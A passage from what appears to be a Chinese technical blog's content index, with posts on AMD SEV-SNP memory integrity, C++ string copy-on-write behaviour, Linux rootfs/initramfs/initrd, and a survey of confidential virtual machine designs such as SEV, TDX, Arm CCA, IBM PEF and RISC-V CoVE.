只有内存页面的拥有者才能够写入该页面 。具体实现方式是引入了新的数据结构 RMP（Reverse Map Table），RMP 是一个在整个系统中共享的单一数据结构，它包含了每个虚拟机可能使用的 HPA 页面的条目。RMP 的作用是为了跟踪每个内存页面的拥有者。\n\nRMP 表不能直接被写入，需要通过 SEV-SNP 引入的新的 CPU 指令来操作。\n\nRMP 检查在虚拟地址通过 Page Walk 得到 HPA 后进行，无论是 Hypervisor 还是虚拟机都需要进行。对于 Hypervisor 而言，它无需进行两阶段地址翻译，因此在完成 VA -&gt; PA 后，查看 PA 对应的 RMP 条目，验证本页面是否属于 Hypervisor；对于虚拟机而言，它在完成 GVA -&gt; GPA -&gt; HPA 后， 查看 HPA 对应的 RMP 条目，检查本次访存是否合法（具体检查内容下文详细讨论）。\n\n数据重放（Data Replay）攻击方式在引入虚拟机内存加密的情况下，虽然无法直接得知从虚拟机中读取到的内存数据的内容，但由于写入操作不受限制，因此恶意的 Hypervisor 可以将从某个内存页处读取到的旧数据保存起来，在未来的某个时刻将这些旧数据进行重放。\n注意，Hypervisor 由于没有被分配 AES 密钥，因此读取到的数据为密文。此时 Hypervisor 不必知道这段密文内容是什么，只需要知道它可能代表了虚拟机某一时刻的状态，Hypervisor 可以在未来的某个时刻将这段密文数据覆写到原来的内存位置，即将虚拟机的某段内存状态进行回退，从而实施可能的攻击。\n\n由于 AES 加密为对称式加密，因此写入经同一个密钥加密的密文数据效果就等同于直接写入明文数据。\n\n防御方式目标： 只有内存页面的拥有者才能写入页面。\n在 RMP Check 时检查 RMP 条目的 Assigned, ASID, Immutable 字段，验证本次内存写入者是否是页面的拥有者。不同拥有者类型所对应的字段值如下表所示：\n\n\n\n\nOwner\nAssigned\nASID\nImmutable\n\n\n\n\nHypervisor\n0\n0\n-\n\n\nGuest\n1\nASID of the guest\n-\n\n\nAMD-SP\n1\n0\n1\n\n\n\n\n数据污染（Data Corruption）攻击方式恶意 Hypervisor 直接将垃圾数据写入虚拟机的内存中，可能造成预期外的行为。\n防御方式目标： 同数据重放。\nAMD SEV-SNP 实现方式：同数据重放。\n内存混叠（Memory Aliasing）攻击方式恶意 Hypervisor 通过直接写入第二阶段页表，将多个 GPA 映射到同一个 HPA 上。这样的“内存混叠”现象将很容易导致特定物理内存页面的数据被污染，造成预期外的行为。\n防御方式目标： 每个 host 内存页面在同一时间只能被一个 guest 内存页面映射。\n在 AMD SEV-SNP 中，RMP 条目引入了 Guest_Physical_Address 字段，保存了映射到本页面的 GPA。在执行 RMP 检查时，验证发起本次访存的 GPA 是否等于 Guest_Physical_Address。\n内存重映射（Memory Re-Mapping）攻击方式恶意 Hypervisor 通过直接写入第二阶段页表，将一个 GPA 映射到多个 HPA，或者更改它所映射的到的 HPA。这将导致虚拟机看到一个不连续的内存视图（an inconsistent view of memory）。下面列举一个可能的场景：\n\nHypervisor 将虚拟地址 0x1000 映射到物理页 P1；\n应用程序向 0x1000 写入敏感数据。\nHypervisor 修改页表，将 0x1000 映射到物理页 P2；\n应用程序再次读取 0x1000，发现数据不见了或变成了其他值；\n程序逻辑因此出错，可能跳过安全检查、泄露信息、甚至崩溃。\n\n防御方式目标： 每个 guest 内存页面在同一时间只能映射一个 host 内存页面。\nAMD SEV-SNP 在 RMP 条目中引入 Validated 位，表示本页面是否已经被验证。每个页面被创建时为未验证状态，必须要经过 PVALIDATE 指令验证（验证过程会检测到是否存在一个 guest 页面重复验证的情况）后才能被写入，页面在被指令 RMPUPDATE 更新后又会变成未验证状态，此时需要重新验证。\n","categories":["操作系统"],"tags":["操作系统","虚拟化","机密计算"]},{"title":"有关C++字符串拷贝的一个小问题","url":"/2023/04/04/%E6%9C%89%E5%85%B3C++%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%B7%E8%B4%9D%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/","content":"最近面试被问到了一个 C++ 中的小问题，就是如果有字符串 s1 和 s2，将 s1 赋值给 s2 后，它们的内存分布是什么样的。当时感觉可能是共享的，但也不太确定，回来后查阅资料发现结果并不是那么简单。\n查阅资料首先是询问 chatGPT 得到的答案，如下：\n\n如果两个 string 对象存储相同的字符串，它们可能会共享同一个内存块，也可能会分别分配自己的内存块。当一个 string 对象被创建时，它会分配一个新的内存块，并将字符串复制到该内存块中。当第二个 string 对象被创建时，它可能会使用与第一个 string 对象相同的内存块，也可能会分配一个新的内存块并将字符串复制到该内存块中。\n\n代码测试看来又是一个没有标准解决方案的问题，于是我编写了一个简单的程序用来在不同的环境下测试。\nvoid* operator new(size_t count) &#123;\tcout &lt;&lt; &quot;Allocate &quot; &lt;&lt; count &lt;&lt; &quot; Bytes&quot; &lt;&lt; endl;\treturn malloc(count);&#125;int main()&#123;\tstring s1 = &quot;Hello World&quot;;\tstring s2 = s1;\tcout &lt;&lt; (void*)(s1.c_str()) &lt;&lt; endl;\tcout &lt;&lt; (void*)(s2.c_str()) &lt;&lt; endl;\ts2[0] = &#x27;h&#x27;;\tcout &lt;&lt; (void*)(s1.c_str()) &lt;&lt; endl;\tcout &lt;&lt; (void*)(s2.c_str()) &lt;&lt; endl;&#125;\n在上面的程序中，我重载了  operator new 函数来追踪内存的分配，然后先初始化字符串 s1，然后再将 s1 作为 s2 的初始值进行赋值，输出 s1 和 s2 字符串的地址是否是同一块，即内存是否共享，然后我再修改 s2 的首字母（之所以这么做是因为修改 s2 后，由于 s1 与 s2 要保持独立性，因此如果之前内存是共用的，那么在修改之前必定需要为 s2 重新分配内存，否则改变 s2 后 s1 也将改变），再输出查看 s1 和 s2 字符串的地址是否相同。\n以下是在不同编译器下程序运行的结果：\ng++\nMSVC\n在 g++ 下未对字符串进行更改时，s1 和 s2 共用一块内存空间，而在修改前才为 s2 分配内存空间。而在 MSVC 下 s1 和 s2 始终没有共用内存空间。可见不同编译器对此情况的处理不尽相同。\n在 g++ 中，对字符串拷贝使用了 COW（Copy-On-Write）技术，即当一个 string 对象被复制时，不会立即复制内存块，而是共享同一个内存块，直到其中一个 string 对象要修改字符串内容时，才会复制内存块并分离出一个新的内存块。这样可以避免频繁的内存分配和复制，提高程序的性能。因此，如果两个 string 对象存储相同的字符串，它们可能会共享同一个内存块。\n而在 MSVC 中，则不采用 COW 技术，而是每个 string 对象都分配自己的内存块来存储字符串。因此，如果两个 string 对象存储相同的字符串，它们会分别分配自己的内存块。\nCOW 的缺点MSVC 之所以不采用 COW 技术，可能是因为 COW 技术会带来一些额外的开销和复杂度。\n首先，COW 技术需要额外的代码来实现内存共享和复制，这会带来一定的性能开销和内存占用。在某些情况下，这种开销可能会超过使用动态内存分配的开销。\n其次，COW 技术会增加代码的复杂度和难度。由于需要处理内存共享和复制，代码的实现会变得更加复杂和难以维护。此外，COW 技术还可能会带来一些潜在的风险，如线程安全性问题等。\n因此，不同的编译器实现可能会根据具体情况来选择是否采用 COW 技术。在一些情况下，COW 技术可以提高性能和效率，但在另一些情况下，它可能会带来额外的开销和复杂度。\n","categories":["C++"],"tags":["C++"]},{"title":"浅谈rootfs、initramfs和initrd","url":"/2025/12/13/%E6%B5%85%E8%B0%88rootfs%E3%80%81initramfs%E5%92%8Cinitrd/","content":"本文算是之前博客 使用QEMU安装并启动一个Ubuntu发行版 | Lordaeron_ESZ’s blog 的一个 callback，花了一天时间整理了一下有关 rootfs、initramfs 等操作系统启动相关的内容，并在此分享出来。\n\nrootfs首先需要理解 rootfs（即根文件系统）的概念。本质上来说，rootfs 就是挂载在根目录（/ 目录）上的文件系统，而无关具体的文件系统类型。\n另外，rootfs 根据系统启动时刻的不同，分为两个阶段，一阶段为系统启动初期的内存 rootfs（通常为 ramfs 和 tmpfs，下面将具体介绍），二阶段为完成基本的模块加载等操作之后的磁盘 rootfs（包括 ext4、zfs 和 btrfs 等等）。\nramfs 和 tmpfsramfs 只是一个简单的文件系统，用作一阶段 rootfs 的文件系统类型，它与磁盘文件系统最大的区别就在于 它没有可供回写的后备设备 ，以 Linux 6.12 内核版本为例（下同），其 ramfs 的代码实现：\n/* fs/ramfs/file-mmu.c */const struct file_operations ramfs_file_operations = &#123;\t.read_iter\t= generic_file_read_iter,\t.write_iter\t= generic_file_write_iter,\t.mmap\t\t= generic_file_mmap,\t.fsync\t\t= noop_fsync,\t.splice_read\t= filemap_splice_read,\t.splice_write\t= iter_file_splice_write,\t.llseek\t\t= generic_file_llseek,\t.get_unmapped_area\t= ramfs_mmu_get_unmapped_area,&#125;;\n可以看到，其 fsync 回调函数为 noop_fsync，它不做任何操作：\n/* fs/libfs.c */int noop_fsync(struct file *file, loff_t start, loff_t end, int datasync)&#123;    return 0;&#125;EXPORT_SYMBOL(noop_fsync);\n由于没有磁盘等后备存储介质，因此对其文件数据的读写和目录的遍历直接工作在 VFS 层，对 ramfs 而言，page cache 和 dentry cache 不是“缓存”，而是 唯一的数据存储位置 。\n回顾 VFS 文件缓存的工作原理：当 page cache 回写到后备存储中后，页面会被标记为干净，此后该页面的 page cache 内存资源可以被安全地释放。但是对于 ramfs 而言，由于它没有后备存储的存在，其 page cache 将永远不会被标记为干净，内存也就无从释放。因此 ramfs 的一个显著的缺点是：可以一直向其中写入数据，直到填满所有内存。\ntmpfs 可以看作是 ramfs 的升级版，它相较于 ramfs 最大的区别在于引入了大小的限制以及 swap 特性，允许在内存资源紧张时将内存数据交换到磁盘的 swap 区域中。值得注意的是，内核代码的 fs 目录下并没有 tmpfs 的目录，其实现放在共享内存相关源文件中：mm/shmem.c。\ninitramfs在系统启动初期，在磁盘等驱动程序模块还未加载时，需要构建一个临时的内存文件系统，即前面提到的内存 rootfs，该文件系统就称为 initramfs。通常来说，initramfs 中的内容包括入口脚本 init（被用作 pid = 1 进程）、内核模块、核心工具集等，会被打包成为一个 cpio.gz 文件。其既可以直接被链接到内核镜像中，也可以指定为外部的 cpio.gz 文件。\ninitramfs 在内核启动初期会被解压缩提取到内存 rootfs 中，提取后，内核会将其中的 init 文件作为 pid = 1 的进程来执行。此进程负责启动系统的其余部分，包括定位和挂载最终的磁盘 rootfs，并借助 switch_root 工具（核心是通过调用 chroot 系统调用），将整个系统的根目录切换到磁盘 rootfs 中，再在保留 pid = 1 的情况下，通过 exec 将 init 进程替换为磁盘 rootfs 中 init 进程（在现代发行版中，通常为 systemd），完成后续的初始化操作。\n这里可以思考一个问题：为什么需要这样的两阶段？直接加载磁盘 rootfs 不行吗？\n这是因为最终的 rootfs 通常位于磁盘等设备中，甚至是网络服务器中，因此内核必须要有磁盘或是网卡等驱动的支持，但是这些驱动通常不会直接链接到内核中，而是动态加载，因此需要将它们放在一个无需任何驱动即可访问的“设备”——内存中，在加载了内存中的相应驱动之后，再过渡到真正的磁盘/网络 rootfs 之中。\n直接将需要的磁盘和网卡等驱动链接到内核中当然也是一种方法，但是这会牺牲一定的灵活性，可能要为了应对各种情况将大量的驱动程序都预先链接进内核。两阶段的做法实质上是一个权衡之下的选择。\nLegacy：initrd在 initramfs 诞生前，一阶 rootfs 是基于 initrd（全称为 init ram disk）来实现的。initrd 本质上是一个虚拟的块设备，是被磁盘文件系统（如 ext2）格式化的加载到内存中的镜像文件，内核会将其视为块设备挂载到内存 rootfs 目录树中，在执行其中的脚本并通过 pivot_root 系统调用切换到磁盘 rootfs 之后，该镜像文件所占用的内存空间需要被释放。\n一个小问题在查阅资料的过程中，发现有些地方对此的介绍有些偏差：在 initramfs 的方法下，并不是通过 pivot_root 系统调用进行根目录的切换的，这点在 man 手册（通过 man 2 pivot_root 查看）中有明确说明：\n\nThe rootfs (initial ramfs) cannot be pivot_root()ed.  The recommended method of changing the root filesystem in  this  case  is  to  delete  everything  in rootfs, overmount rootfs with the new root, attach stdin/stdout/stderr to the new /dev/console, and exec the new init(1).  Helper programs for this process exist; see switch_root(8).\n\n之所以有这样的差别，是因为 initrd 是一个模拟的块设备，本身只是一个普通的、可被卸载的挂载点；而 initramfs 就是系统启动时的 rootfs 本身的第一（内存）阶段，rootfs 是一个特殊的、不可卸载的文件系统实例。简单来说，initrd 的切换做法是“切换并卸载”，而 initramfs 的切换做法则是“删除并覆盖”。\n参考资料\nRamfs、rootfs 和 initramfs — Linux 内核文档\nTmpfs — Linux内核文档\nYanyan’s Wiki\n\n","categories":["操作系统"],"tags":["操作系统","Linux","文件系统"]},{"title":"现有机密虚拟机设计方案汇总","url":"/2025/12/15/%E7%8E%B0%E6%9C%89%E6%9C%BA%E5%AF%86%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%A1%88%E6%B1%87%E6%80%BB/","content":"本文算是一个笔记性质的文章，整理了现有的大部分机密虚拟机（CVM）的设计方法，并主要围绕硬件/固件扩展、内存机密性保护、内存完整性保护、寄存器状态保护几个方面来介绍。覆盖了市面上的大多数 CVM 设计，既包括工业界已商用的方案，如 AMD SEV、Intel TDX 等，也包括一些学术界的方案，如 VirTEE、ZION。\n\n由于 Arm 官方方案 CCA 的标准和软件栈趋近成熟，因此基于 Arm 架构的其它方案如 TwinVisor 和 virtCCA 在此便不再介绍了，以下是个人整理的现有 CVM 方案的列表：\n\nAMD SEV-SNP: 现已商用。\nIntel TDX: 现已商用。\nArm:\nTwinVisor (SOSP ‘21): None\nvirtCCA (arXiv): None\nCCA (官方方案): 硬件规范成熟，软件栈快速构建中，支持的芯片（Arm v9）还未上市。\n\n\nIBM PEF: 现已商用，发表论文（EuroSys ‘21）。\nRISC-V:\nCoVE: 社区官方方案，正在建设中\nVirtTEE (DAC ‘22):\n向下兼容，虚拟机内核无需经过修改。\n原生支持安全热迁移和安全 I/O。\n\n\nZION (DAC ‘25): 无需任何硬件扩展，可在现有的 RISC-V 处理器上实现。\n\n\n\nx86AMD SEV硬件/固件扩展硬件扩展为内存控制器中的加密引擎、扩展 MMU、MSR、安全协处理器 PSP 等，PSP 中运行的固件充当软件 TCB 的角色，该固件只开放了 API 接口，具体实现并未开源。\n内存机密性保护将物理地址的最高位作为加密位（C-bit），使用 C-bit 为 1 的物理地址进行访存时，数据在进出（写入/读取）DRAM 时会被内存控制器上的 AES 引擎自动进行加密和解密。由于虚拟机内存数据在运行时也出于加密状态，因此能够有效抵御冷启动攻击。\n\n内存完整性保护引入 RMP 表数据结构，并使用特定 MSR——RMP_BASE（0xc0010132） 和 RMP_END（0xc0010133）标记一块内存区域，用于存储 RMP 表的条目，该内存区域只能被 PSP 进行写入。\nRMP 表条目中包含 assigned、gpa、asid、validated 等字段，用于标识一个宿主机物理页面（PFN）是否已分配给了虚拟机，以及分配给了虚拟机的哪个物理页面（GFN）。在完成地址转换得到 HPA 并访存前进行 RMP 检查，判断本次访存是否合法。\n由于硬件内存加密机制已经提供了机密性的保障，因此针对内存读访问的情况，将不会进行 RMP 检查。\n\n寄存器状态保护SVM 的 vcpu 数据结构 VMCB 被划分为两部分：控制字段和数据字段（以下称为 VMSA）。其中控制字段不加密，完全由 Hypervisor 所掌控，而 VMSA 需要加密以确保机密性，同时还需要引入完整性保护以防止 Hypervisor 对其进行破坏。\n\n关于完整性保护部分，根据 SEV-ES 白皮书中的描述，基于 intergrity-check 来实现，应该就是计算 VMSA 的哈希值并存储在一段无法被软件访问的 DRAM 区域，在恢复虚拟机执行时检查哈希值是否匹配以确保寄存器状态没有被恶意篡改。而 SEV-SNP 由于引入了内存完整性保护，因此可以借助 RMP 表为 VMSA 提供完整性保护。\n\n\n安全增强SEV-SNP 在机密虚拟机内存继续进行特权级划分（基于内存的访问权限），与原本的 CPL 形成正交的关系。在不引入安全增强（Security Enforcement）的情况下，虚拟机内核直接运行在 VMPL0（VMPL 的最高特权级）；而引入了 Security Enforcement 的情况下，VMPL0 运行着一个全新的特权软件（官方实现为 SVSM），用于接管许多原来需要在虚拟机内核中做的工作，如 #VC 异常的处理、PVALIDATE 指令的执行等。\n\n参考文献\nDavid Kaplan, Jeremy Powell, and Tom Woller. 2016. AMD memory encryption. White paper (2016).\nDavid Kaplan. 2017. Protecting VM register state with SEVES. White paper (2017).\nAMD. 2020. AMD SEV-SNP: Strengthening VM Isolation with Integrity Protection and More. White paper (2020).\n\nIntel TDX硬件/固件扩展Intel TDX 的硬件扩展主要包括一些 MSR、内存加密引擎，固件包括 TDX 模块、用于验证和加载 TDX 模块的 SEAMLDR。\nTDX 的基本架构如下图所示。TDX 模块是核心组件，由 SEAMRR 寄存器标识其内存范围并提供保护，作为不可信的 VMM 与 TD（可信执行单元，本文简单认为是机密虚拟机）之间的间接层，向 VMM 提供 SEAMCALL 接口，包括创建、删除、调度 TD 等。此外，它还接管了非机密虚拟机环境下 VMM 的部分职责，即虚拟机的进入和退出。在 TDX 中，TD 在发生异常或中断时并不会直接退出到 VMM 中，而是退出到 TDX 模块中。同时，TDX 模块也向 TD 提供了类似非机密虚拟机环境下的 Hypercall 接口——TDCALL，运行虚拟机向“VMM”发起请求。\n\n内存机密性保护Intel TDX 基于 MKTME 内存加密实现内存的机密性，与 SEV 内存加密不同的是，TD 的 GPA 中的最高位不是加密位（C-bit）而是共享位（Shared bit），该位为 1 时代表页面是与 VMM 等其它不可信实体共享的页面。\n加密密钥由密钥 ID（以下称作 KeyID）来决定，KeyID 被分为两类：私有 KeyID 和共享 KeyID。其中私有 KeyID 由 TDX 模块管理，在 TD 创建时为每个 TD 分配一个独一无二的私有 KeyID，用于对内存进行加解密；而共享 KeyID 则由 VMM 来管理，可以被其用作对自身内存或是 TD 的共享内存进行加密。\n\n内存完整性保护Intel TDX 的 KeyID 不光用作加密用途，还能够实现强大的完整性保障。TDX 的完整性保障分为两类：加密完整性保护（cryptographic-integrity protection）和逻辑完整性保护（logical-integrity protection），前者为 TDX 的默认保护方式，能同时防止特权软件的恶意写入和 rowhammer 等基于物理硬件特性的攻击方式，后者则只能防止特权软件的恶意写入。\n对于逻辑完整性保护而言，它只是在 Cache 行中引入一个 1bit 的 TD 标记位（TD-ownership bit），用以标记该行是否属于 TD 的私有内存，该位通过访存时使用的 KeyID 是否为私有 KeyID 来自动填充到 Cache 中。非 TD 区域的实体如 VMM 尝试对该内存区域进行写入（或读取）时，由于此时 CPU 并不处于 SEAM 模式下，因此访存失败，返回一个固定的填充模式，防止 VMM 进行密文分析。\n而在加密完整性保护的模式下，还在 TD 标记位的基础上，增加了基于密码学的完整性保护方式。具体来说，内存控制器的加密引擎将缓存行粒度的数据计算基于 SHA3 的 MAC（28 位）值，MAC 计算使用的密钥同样是加密密钥。有了这样 MAC 值的存在，当外部实体对内存的数据进行破坏后，当再次从内存中读取该段数据时，将会再次计算 MAC，此时将会发现不匹配的情况，从而检测出内存完整性问题。这样基于 MAC 的完整性保护，能够抵御 VMM 绕过 Cache，直接使用 rowhammer 等方式直接篡改内存中的数据的攻击方式。\n\nIntel TDX 的内存完整性保护方案和 AMD SEV-SNP 有很大的区别，前者是在访存的数据写入阶段（写入 Cache）进行防护，而后者则是在地址转换结束以及数据写入之前进行防护。\n\n\n除此之外，Intel TDX 还引入了“双二阶页表”的设计，对于一个 TD 而言，包含一个 Secure EPT 和 Shared EPT，其中 Secure EPT 用于存储 private GPA 到 HPA 的映射；Shared EPT 用于存储 shared GPA 到 HPA 的映射。\nShared EPT 就相当于非机密虚拟机下的 EPT，由 VMM 直接管理；而 Secure EPT 则由 TDX 模块来管理，存储在 SEAM 的私有内存中，无法被 VMM 直接读写。此外，TDX 模块通过向 VMM 提供有限的接口，如向 Secure EPT 中添加或删除条目，TDX 模块会保证这些 VMM 发起的 Secure EPT 修改操作不会破坏安全性保证。\n寄存器状态保护当 TD 创建的时候，TDX 模块会请求 VMM 提供一个 VMCS 页面作为 TD 的初始寄存器状态。该页面将作为 TD 的寄存器 VMCS 结构而存在，就像非机密虚拟机一样负责虚拟机和宿主机寄存器状态的保留和恢复。同时为其施加内存的机密性和完整性保护，使得其无法被 VMM 所访问。此后 TD 退出时，将会推出到 TDX 模块中而不是直接回到 VMM，因此防止了 TD 寄存器状态的泄露。\n参考文献\nI. Corporation, “Intel Trust Domain Extensions (intel TDX) whitepaper,” 2024, accessed: 2024-11-20. [Online], Available: https://www.intel.com/content/dam/develop/extemal/us/en/ documents/tdx-whitepaper-final9- 17.pdf\n\nArmCCA硬件/固件扩展Arm CCA 的硬件扩展主要包括寄存器的一位（SCR_EL3.NSE）用于标识是否位于 Realm 世界中，内存控制器中的加密引擎用于实现硬件内存加密，扩展 MMU 用于实现 GPT 表的检查。固件方面主要包括全新的运行在 Realm 中的 EL2 固件——RMM，以及对原本的 EL3 Monitor 进行扩展，并分别向 RMM 和 Host 提供 RSI 和 RMI 接口。\n\n内存机密性和完整性保护PAS在介绍 CCA 如何提供内存隔离机制前，需要解释一下 PAS（Physical Address Space） 的概念。和实现进程与进程之间隔离的虚拟地址空间 AS 类似，PAS 定义了一系列彼此之间相互隔离的物理地址空间。当然这里的“隔离”也并非是 DRAM 芯片上的隔离，而同样是通过 CPU 寄存器状态、页表条目以及 MMU 等软硬件协同机制实现的。\n在 CCA 中，根据 EL 特权级和 SCR_EL3 寄存器的状态，共划分出四个 PAS：Non-secure、Secure、Realm、Root，其访问控制规则如下表所示：\n\n内存加密Arm CCA 引入了类似 AMD SEV 的硬件内存加密功能，实现方式都是在内存控制器中引入加密引擎，在数据从 CPU 中写入到 DRAM 或从 DRAM 中读取到 CPU 时进行加解密，密钥选择上较 SEV 来说更为复杂，可以选择根据 PAS 来决定，即整个 Realm PAS 中的所有虚拟机共享一个密钥，也可以进行更为细致的配置，具体细节在此不过多展开。\n内存隔离内存隔离的实现主要基于两个方面来实现：一是强制执行 PAS 节中表格所示的访问控制规则；二是控制 host 无法直接篡改 Realm 的二阶页表（CCA 中称为 Realm Translation Tables, RTT）。\n第一点基于 GPT（Granule Protection Table） 表数据结构来实现。GPT 表的条目以 Granule（也就是页面，CCA 中目前只支持 4KB 小页）为粒度，用于跟踪整个计算机系统中的每个 4KB 页面的 PAS 归属，由 EL3 Monitor 进行管理，不允许其它实体对其条目进行更新。\n第二点基于 Realm 的二阶页表由 RMM 负责管理。Host 只能通过借助向 EL3 Monitor 发起 RMI 请求来对 Realm 二阶页表的间接操作，如创建、销毁等，正因为有了这个间接层，Host 才无法在可信组件不知情的情况下恶意对二阶页表进行篡改，从而扰乱 Realm 的执行。\n基本的 RMI 接口如下图所示：\n\n寄存器状态保护寄存器状态的保护是基于内存隔离机制的，具体来说，Host 只能通过发起有限的几个 REC（Realm Execution Context，相当于虚拟机的 vCPU） 相关的 RMI 对 Realm 寄存器的状态进行控制，包括创建、销毁、运行。Realm 的 REC 具体内容保存在 RMM 中，为 Realm PAS 的部分，无法被 Host 所访问。每次 Realm 进入和退出时，借助 REC 进行保留和恢复，因此 Host 无法破坏执行中的 Realm 寄存器状态。\n参考文献\nX. Li, X. Li, C. Dall, R. Gu, J. Nieh, Y. Sait, and G. Stockwell, “Design and verification o f the arm confidential compute architecture,” in 16th USENIX Symposium on Operating Systems Design and Implementation (OSDI 22), 2022, pp. 465-484.\nhttps://developer.arm.com/documentation/den0125/400\n\nPowerPCPEF硬件/固件扩展通过新的 MSR 位定义新的特权级 Secure Mode，并引入固件 Ultravisor 运行在该特权级下。同时，安全虚拟机 SVM 也运行在该模式下。\n\nUltravisor 作为最高特权级软件，向 Hypervisor 和虚拟机开放 Ultracall 接口，用以提供安全特性的支持，诸如对 SVM 的创建等操作。由于 Hypervisor 等实体都需要借助 Ultracall 才能管理安全设施，因此 Ultravisor 中便能通过引入一系列数据结构等进行记录，检测 Hypervisor 发起的 Ultracall 请求是否会破坏安全设施，如果可能， Ultravisor 将不会报告任何错误，但是也什么都不做。\n\n这里 without performing the action and does not indicate an error 的选择值得思考。\n\n\n内存机密性和完整性保护内存被划分为安全内存和非安全内存，使用地址的一位进行标识（a high order address bit, RA(15)，不确定是哪一位），标记为 1 的即为安全内存，只有位于 Secure Mode 下的程序才能访问安全内存。以此实现内存的机密性和完整性。\nPOWER9 架构上实现的方案暂不支持类似 AMD SEV 那样的硬件内存加密，因此无法抵御冷启动等物理内存攻击。硬件内存加密将会在 POWER10 架构中引入。因此在 Hypervisor 在尝试将 SVM 的安全内存转变为非安全内存前，Ultravisor 会负责将该内存进行加密，同时刷新相关 TLB 条目等，防止数据发生泄露。\n寄存器状态保护在安全模式下，所有的 hypercall 都会直接传递到 Ultravisor 中，异步中断（如时钟中断、设备中断）都会直接传递到 Ultravisor 或 SVM（应该是虚拟机自己能处理的） 中。因此在这种模式下，每次虚拟机退出时，都不会直接跳转到不安全的 Hypervisor 中导致寄存器状态发生泄漏。对于 hypercall 而言，在 Ultravisor 中会进行寄存器状态的保存，并清除掉除了必要的寄存器（如 hypercall 的参数）外的其它寄存器状态，在进入 Hypervisor 中进行处理，处理完成后先回到 Ultravisor 中将虚拟机寄存器状态恢复回来。\n参考文献\nGuerney DH Hunt, Ramachandra Pai, Michael V Le, Hani Jamjoom, Sukadev Bhattiprolu, Rick Boivie, Laurent Dufour, Brad Frey, Mohit Kapur, Kenneth A Goldman, et al. 2021. Confidential computing for OpenPOWER. In Proceedings of the Sixteenth European Conference on Computer Systems. 294310.\n\nRISC-VCoVE硬件/固件扩展CoVE 的硬件扩展包括扩展 MMU 以支持 MMT 表查询，扩展 CSR 以支持机密状态位 Confidential-mode qualifier（以下简称 C-bit）。固件扩展包括在 HS 模式（与不可信 Host 同样的特权级）下引入 TSM，作为 TVM 的轻量级管理程序，同时对 M-mode 固件（如 OpenSBI）进行扩展，引入 TSM-driver，作为 Host 和 TSM 的高特权中间层，实现二者的隔离。\n\nTSM 主要提供以下两类 ABI：\n\n将 TSM-driver 作为中间层，向 Host 提供 COVH-ABI，用于管理 TVM 的声明周期，例如创建 TVM、向 TVM 添加内存页面和 vhart（相当于其它架构的 vCPU），调度 vhart 执行等。\n向 TVM 提供 COVG-ABI，允许 TVM 请求认证报告，内存共享或解除共享等 VirtIO 相关功能。\n\n具体来说，主要包括：\n\n平台的 TSM 检测和能力枚举，包括版本、功能特性等。\n允许 VMM “捐赠”内存给 TSM 进行管理。\n创建 TVM，并为其分配机密内存。\n将 TVM 的代码和数据初始化为机密内存，作为 TVM 初始化的一部分，同时对这些机密内存进行度量。\nTVM 初始化时其非机密内存部分将会被完全置零。\n创建 TVM 的  vhart 数据结构，并负责在进出 TVM 前后对其进行保留和恢复。\n完成 TVM 的创建，机密内存的度量值将可用于远程证明。\n负责处理 TVM 的退出事件，包括 vhart 调度、中断注入、异常处理等。\n映射 TVM 的 demand-zero（不太理解）机密内存区域，便于实现机密内存的 lazy allocation。\n映射 TVM 的共享内存部分。\n停止 TVM 的执行，以及回收 TVM 的内存资源。\n\n内存机密性和完整性保护TSM 作为 TVM 的“轻量级 Hypervisor”，同时负责对其机密和非机密内存进行分配和管理。但是 CoVE 实现对机密内存的保护并不是基于 RISC-V 的 PMP，而是采用了类似 AMD SEV-SNP 的方案，对硬件 MMU 进行扩展，并在完成地址转换并准备访存前对内存跟踪数据结构 MMT 表进行检查，确保本次访存合法，才能触发访存。\n但是相较于 SEV-SNP 的 RMP 表，MTT 表的设计简单了很多。由于 TSM 端已经完成了机密/非机密内存的抽象，因此最少只需要引入一个 C-bit 标识是否是机密内存（为 1 则代表机密内存），并规定只有 CSR 状态中 C-bit 为 1 的 CPU 才能访问机密内存。同时，控制不可信实体（如 Host、普通 VM 等）运行在 C-bit 为 0 的状态下，可信的 TVM 等运行在 C-bit 为 1 的状态下。\n\n\n需要注意的是，这里 C-bit 的概念既包括某个 CSR 中的一位，用来标志 CPU 运行的状态，即是否运行在可信的可信的实体中；同时还用来指示一个物理页面是否属于机密内存。\n\n下图是在引入了 MTT 表之后的访存流程：\n\n在论文中以及官方手册中也提到，针对 C-bit 为 1 的页面，可以考虑引入硬件内存加密和基于密码学的完整性保护（基于 MAC）等，可以有效防止冷启动等基于物理的攻击方式，不过这一特性是否采用及其具体实现依特定平台而定。\n寄存器状态保护由于 TSM 承担了处理 TVM 退出事件的任务，且机密内存与 Host 相隔离，自然实现了寄存器状态的保护。\n参考文献\nR. Sahita, V. Shanbhogue, A. Bresticker, A. Khare, A. Patra, S. Ortiz, D. Reid, and R. Kanwal, “Cove: Towards confidential computing on riscV platforms,” in Proceedings o f the 20th ACM International Conference on Computing Frontiers, 2023, pp. 315-321.\nRISC-V AP-TEE Task Group, Version 0.3, 1/2024, Confidential VM Extension (CoVE) for Confidential Computing on RISC-V  platforms.\n\nVirTEE硬件/固件扩展首先在 M-mode 下对固件（如 OpenSBI）进行扩展，引入安全监视器 Security Monitor。同时从内存中划分出多个安全区域（和大多数 TEE 一样，称为 Enclave），实现方式是引入一些只能被安全监视器访问的寄存器，用于对 Enclave 的地址范围进行标识。此外，为了抵御缓存侧信道攻击，VirTEE 在系统总线层引入了一个过滤引擎，当一个 CPU 核心位于一个 Enclave 区域内执行时，它的缓存数据会借助过滤引擎，与其它 CPU 核心隔离开，不进行共享。而当 CPU 核心退出 Enclave 区域时，硬件会自动清除它的所有缓存信息，防止数据被其它核心窃取。\n此外，还在每个 Enclave 中都引入一个 Enclave Monitor，运行在 HS 模式下（非 CVM 的 Hypervisor 运行模式），作为 CVM 的 Hypervisor，负责虚拟机二阶页表的管理和处理虚拟机的退出事件等，由于 Enclave Monitor 位于 TCB 中，因此虚拟机内核无需作任何修改，以此实现本文工作的创新点—— 完全向下兼容 。\n\nEnclave 创建流程\n宿主机分配连续的物理内存，并按照一定的内存布局将 Enclave Monitor、虚拟机二进制和其它必要的元数据填充到其中。\n宿主机通知 Security Monitor 创建的 Enclave 的内存起始地址和初始内存大小。Security Monitor 为这个 Enclave 分配一个唯一的 id 并将其与它的起始内存地址和大小绑定起来。\n宿主机找到一个可用的 CPU 核心，并将该核心分配给这个 Enclave，并切换到这个核心，将 id 作为参数进行传递并触发 Security 